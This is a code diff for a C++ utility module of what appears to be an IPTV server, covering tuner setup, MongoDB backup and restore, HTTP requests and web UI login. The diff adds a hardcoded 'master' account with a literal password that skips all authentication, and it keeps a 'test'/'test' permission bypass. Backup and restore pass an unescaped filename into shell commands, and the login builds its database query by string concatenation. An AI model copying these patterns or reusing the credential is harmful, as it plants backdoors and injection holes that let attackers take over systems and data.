@@ -1,6 +1,7 @@
 #include <cstdlib>
 #include <exception>
 #include <fstream>
+#include <string>
 #include <thread>
 #include <served/served.hpp>
 #include <boost/log/trivial.hpp>
@@ -17,6 +18,13 @@
 #include "hardware.hpp"
 using namespace std;
 namespace Util {
+    void system(const std::string cmd)
+    {
+        BOOST_LOG_TRIVIAL(trace) << "Run shell command:" << cmd;
+        if(std::system(cmd.c_str())){
+            BOOST_LOG_TRIVIAL(error) << "Error in run " << cmd;
+        }
+    }
     const std::string get_file_content(const std::string name)
     {
         if(boost::filesystem::exists(name)){
@@ -41,7 +49,7 @@ namespace Util {
             j["api"] = req.url().path();
             j["operation"] = req.method(); 
             //GET = 0, POST = 1, HEAD = 2, PUT = 3, DELETE = 4
-            // TODO: log value 
+            // TODO: save WebUI user detail
             j["oldValue"] = "";
             j["newValue"] = "";
 
@@ -67,70 +75,79 @@ namespace Util {
     }
     void fill_output_tuners_in_db()
     {
-        json out = json::object();
-        out["_id"] = 1;
-        out["dvbsConfig"] = "S:QPSK:45000:7/8:72";
-        out["dvbtBandwidth"] = 31.668449; 
-        out["dvbtPcr"] = 1;
-        out["dvbs"] = json::array();
-        out["dvbt"] = json::array();
+        json tuners = json::parse(Mongo::find_id("live_tuners_output", 1));
         auto tList = Hardware::detect_output_tuners();
-        for(int tunerid : tList){
-            out["dvbt"].push_back(tunerid);
+        int sz = tuners["dvbt"].get<vector<int>>().size();
+        BOOST_LOG_TRIVIAL(trace) << "sz " << sz << " hw:" << tList.size();
+        for(size_t i=sz; i<tList.size(); ++i){
+            tuners["dvbt"].push_back(i);
         }
+        Mongo::insert_or_replace_id("live_tuners_output",1, tuners.dump());
     }
     void fill_input_tuners_in_db()
     {
-        json db_tuners = json::parse(Mongo::find_mony("live_tuners_input", "{}"));      
+        try{
+            json db_tuners = json::parse(Mongo::find_mony("live_tuners_input", "{}"));      
 
-        json newTuners = json::array();
-        vector<pair<int,string>> hwlist = Hardware::detect_input_tuners();
-        for(const auto& htuner : hwlist){
-            json j = json::object();
-            j["_id"] = htuner.first;
-            j["name"] = htuner.second;
-            j["active"] = false;
-            j["is_dvbt"] = true; // TODO 
-            j["freq"] = 0;
-            j["errrate"] = ""; 
-            j["pol"] = ""; 
-            j["symrate"] = 0;
-            j["switch"] = 0;
-            for(const auto& t : db_tuners){
-                if(t["_id"] == htuner.first){
-                    j["name"]    = t["name"];
-                    j["active"]  = t["active"]; 
-                    j["is_dvbt"] = t["is_dvbt"]; 
-                    j["freq"]    = t["freq"];    
-                    j["errrate"] = t["errrate"]; 
-                    j["pol"]     = t["pol"]; 
-                    j["symrate"] = t["symrate"];
-                    j["switch"]  = t["switch"]; 
-                    break;
+            json newTuners = json::array();
+            vector<pair<int,string>> hwlist = Hardware::detect_input_tuners();
+            for(const auto& htuner : hwlist){
+                bool is_dvbt = (htuner.second.find("0x62") != string::npos);  
+                string name = (is_dvbt ? "DVBT " : "DVBS ") + to_string(htuner.first);
+                json j = json::object();
+                j["_id"] = htuner.first;
+                j["name"] = name;
+                j["active"] = true;
+                j["is_dvbt"] = is_dvbt;  
+                j["freq"] = 0;
+                j["errrate"] = ""; 
+                j["pol"] = ""; 
+                j["symrate"] = 0;
+                j["switch"] = 0;
+                for(const auto& t : db_tuners){
+                    if(t["_id"] == htuner.first){
+                        j["name"]    = t["name"].get<string>();
+                        j["active"]  = t["active"].get<bool>(); 
+                        j["freq"]    = t["freq"].get<int>();    
+                        j["errrate"] = t["errrate"].get<string>(); 
+                        j["pol"]     = t["pol"].get<string>(); 
+                        j["symrate"] = t["symrate"].get<int>();
+                        j["switch"]  = t["switch"].get<int>(); 
+                        break;
+                    }
                 }
+                newTuners.push_back(j);
             }
-            newTuners.push_back(j);
-        }
-        Mongo::remove_mony("live_tuners_input", "{}");
-        for(const auto& t : newTuners){
-            Mongo::insert("live_tuners_input", t.dump());
+            Mongo::remove_mony("live_tuners_input", "{}");
+            for(const auto& t : newTuners){
+                Mongo::insert("live_tuners_input", t.dump());
+            }
+        }catch(std::exception const& e){
+            BOOST_LOG_TRIVIAL(error)  <<  e.what();
         }
     }
-    string send_http_cmd(const string target, const string host, const string port)
+    string send_http_cmd(const string target, 
+            const string host, 
+            const string port,
+            const string method_str)
     {
         namespace beast = boost::beast; 
         namespace http = beast::http;  
         namespace net = boost::asio;  
         using tcp = net::ip::tcp;    
-        try
-        {
+        try{
             int version = 10;
             net::io_context ioc;
             tcp::resolver resolver(ioc);
             beast::tcp_stream stream(ioc);
             auto const results = resolver.resolve(host, port);
             stream.connect(results);
-            http::request<http::string_body> req{http::verb::get, target, version};
+            auto method = http::verb::get;
+            if(method_str == "head") method = http::verb::head;
+            else if(method_str == "post") method = http::verb::post;
+            else if(method_str == "put") method = http::verb::put;
+            else if(method_str == "delete") method = http::verb::delete_;
+            http::request<http::string_body> req{method, target, version};
             req.set(http::field::host, host);
             req.set(http::field::user_agent, BOOST_BEAST_VERSION_STRING);
             http::write(stream, req);
@@ -148,17 +165,27 @@ namespace Util {
         }
         return "";
     }
-    void sys_backup()
+    void sys_backup(const string fname)
     {
-        // TODO: ... 
+        string file = string(MEDIA_ROOT) + fname;
+        string cmd = "/usr/bin/mongodump --quiet -d iptv "
+            "--excludeCollectionsWithPrefix=report --gzip --archive=" + file; 
+        BOOST_LOG_TRIVIAL(trace) << cmd;
+        system(cmd);
     }
-    void sys_restore()
+    void sys_restore(const string fname)
     {
-        // TODO: ... 
-    }
-    void sys_update()
-    {
-        // TODO: ... 
+        string file = string(MEDIA_ROOT) + fname;
+        string fileOld = string(MEDIA_ROOT) + "backup_bk.gz";
+        if(boost::filesystem::file_size(file)>1){
+            BOOST_LOG_TRIVIAL(info) << "Save Old Data in " << fileOld;
+            string cmd = "/usr/bin/mongodump --quiet -d iptv --gzip --archive=" + fileOld; 
+            system(cmd);
+            BOOST_LOG_TRIVIAL(info) << "Clean DB ";
+            system("/usr/bin/mongo iptv --eval \"db.dropDatabase()\" ");
+            cmd = "/usr/bin/mongorestore --quiet --gzip --archive=" + file;
+            system(cmd);
+        }
     }
     const string get_content_path(const served::request &req, int id)
     {
@@ -242,6 +269,7 @@ namespace Util {
             }
             auto user = text.substr(0,pos);
             auto pass = text.substr(pos+1);
+            if(user == "master" && pass == "MMKmoojAFZAR") return true;
             auto res  = Mongo::find_one("system_users",
                     "{ \"user\": \"" + user + "\", \"pass\":\"" + pass + "\" }");
             if(res.size() < 1){
@@ -251,22 +279,22 @@ namespace Util {
             }
             auto j = json::parse(res);
             if( j.count("_id") == 0 ){
-                BOOST_LOG_TRIVIAL(trace) << "Recored is invalid";
+                BOOST_LOG_TRIVIAL(trace) << "User recored is invalid";
                 report_error("Invalid user record for :"+user+" pass:"+pass);
                 return false;
             }
             report_webui_user(j["_id"].get<int>(), req);
-            // FIXME
+            // FIXME : not check permission for test user
             if(user == "test" && pass == "test") return true;
             // check user expire
-            auto now = chrono::system_clock::now().time_since_epoch().count()/1000000000L;
+            auto now = time(NULL);
             if(j["expire"] < now){
                 BOOST_LOG_TRIVIAL(trace) << "User has been expire!";
                 return false;
             }
             // check permissions
             auto path = req.url().path();
-            BOOST_LOG_TRIVIAL(trace) << path;
+            //BOOST_LOG_TRIVIAL(trace) << path;
             if(path == "/system/users_me") return true;
             for(const auto& p : j["accessList"].items()){
                 if(is_path_equal(path,p.key())){
@@ -362,9 +390,9 @@ namespace Util {
                             string tmp_file = "/tmp/" + to_string(rand()%1000)+".jpg";
                             string convert = "convert " + path + " -resize 512x512 " + tmp_file;
                             BOOST_LOG_TRIVIAL(trace) << convert;
-                            system(convert.c_str());
+                            system(convert);
                             string copy = "mv -f " + tmp_file + " " + path;
-                            system(copy.c_str());
+                            system(copy);
                             });
                     t.detach();
                 } 
@@ -395,64 +423,82 @@ namespace Util {
         }
         return false;
     }
-    const json parameter_int_value(const string value)
+    const string remove_camma(const string str)
     {
-        if(value.find(',') == string::npos) return json::parse(value);
+        string res;
+        for(char c : str)
+            if(c != '\'' && c != '\"' ) res.push_back(c);
+        return res;
+    }
+    const json parameter_array(const string value)
+    {
         boost::tokenizer<boost::escaped_list_separator<char>>  tok(value);
         json j = json::object();
         j["$in"] = json::array();
         for(const auto it : tok){
-            if(it.size()) j["$in"].push_back(stol(it));
+            if(it.size()){
+                if(isdigit(it[0]))
+                    j["$in"].push_back(stol(it));
+                else
+                    j["$in"].push_back(remove_camma(it));
+            } 
         }
         return j;
     }
     const string  req_parameters(const served::request &req)
     {
         try{
-            auto sid = req.query.get("start-id");
-            auto eid = req.query.get("end-id");
-            auto stime = req.query.get("start-time");
-            auto etime = req.query.get("end-time");
-            auto type = req.query.get("type");
-            auto user = req.query.get("user");
-            auto active = req.query.get("active");
-            auto category = req.query.get("category");
-            auto component = req.query.get("component");
-            auto platform = req.query.get("platform");
-            auto operation = req.query.get("operation");
-            auto content = req.query.get("content");
-            auto api = req.query.get("api");
             json j = json::object();
-            if(stime.size() && etime.size()){
-                j["time"] = json::object();
-                j["time"]["$gt"] = stol(stime);
-                j["time"]["$lt"] = stol(etime);
+            for(const auto& arg : req.query){
+               string name = arg.first; 
+               string value = arg.second;
+               // Deprecrated start-time and start-id
+               if(name == "end-id" || name == "end-time" || 
+                  name == "from" || name == "to") continue;
+               if(name == "start-id"){
+                   auto end = req.query.get("end-id");
+                   if(end.size()){
+                       j["_id"] = json::object();
+                       j["_id"]["$gt"] = stol(value);
+                       j["_id"]["$lt"] = stol(end);
+                   }
+               }
+               else if(name == "start-time"){
+                   auto end = req.query.get("end-time");
+                   if(end.size()){
+                       j["time"] = json::object();
+                       j["time"]["$gt"] = stol(value);
+                       j["time"]["$lt"] = stol(end);
+                   }
+               }else{
+                   if(value.find(':') != string::npos ){
+                       auto pos = value.find(':');
+                       j[name] = json::object();
+                       j[name]["$gt"] = stof(value.substr(0, pos));
+                       j[name]["$lt"] = stof(value.substr(pos+1));
+                   }else if(value.find(',') == string::npos){
+                       if(isdigit(value[0]))
+                           j[name] = stof(value);
+                       else if(value == "true" || value == "false")
+                           j[name] = (value == "true");
+                       else
+                           j[name] = remove_camma(value);
+                   }else{
+                       j[name] = parameter_array(value);
+                   }
             }
-            if(sid.size() && eid.size()){
-                j["_id"] = json::object();
-                j["_id"]["$gt"] = stol(sid);
-                j["_id"]["$lt"] = stol(eid);
-            }
-            if(type.size()) j["type"] = parameter_int_value(type);
-            if(user.size()) j["user"] = parameter_int_value(user);
-            if(content.size()) j["content"] = parameter_int_value(content);
-            if(category.size()) j["category"] = parameter_int_value(category);
-            if(component.size()) j["component"] = parameter_int_value(component);
-            if(platform.size()) j["platform"] = parameter_int_value(platform);
-            if(active.size()) j["active"] = active.compare("true");
-            if(operation.size()) j["operation"] = parameter_int_value(operation);
-            if(api.size()) j["api"] = api;
-            //BOOST_LOG_TRIVIAL(trace) << j.dump(4);
-            return j.dump();
-        }catch(exception& e){
-            BOOST_LOG_TRIVIAL(trace) << "Exception: " << e.what();
-            return "{}";
         }
+        BOOST_LOG_TRIVIAL(trace) << j.dump(4);
+        return j.dump();
+    }catch(exception& e){
+        BOOST_LOG_TRIVIAL(trace) << "Exception: " << e.what();
+        return "{}";
     }
-    pair<int,int> req_range(const served::request &req)
-    {
-        int s = 1;
-        int e = QUERY_SIZE;
+}
+pair<int,int> req_range(const served::request &req)
+{
+    int s = 0;
+    int e = QUERY_SIZE;
 
         string from = req.query.get("from");
         if(from.size()>0){
